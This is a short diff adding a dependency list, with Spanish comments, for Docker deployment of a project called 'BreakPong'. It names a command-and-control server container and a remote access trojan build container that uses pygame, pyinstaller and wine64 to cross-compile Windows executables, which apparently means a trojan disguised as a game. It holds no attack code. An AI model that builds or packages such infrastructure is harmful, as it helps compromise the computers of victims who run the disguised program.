@@ -1,0 +1,16 @@
+# BreakPong Docker Deployment
+# Para containerización de la infraestructura
+
+# === BASE IMAGE DEPENDENCIES ===
+# Usar en Dockerfile para imagen optimizada
+
+# C2 Server Container
+python:3.11-slim
+gcc
+libpq-dev
+
+# RAT Build Container  
+python:3.11
+pygame
+pyinstaller
+wine64  # Para cross-compilation Windows desde Linux
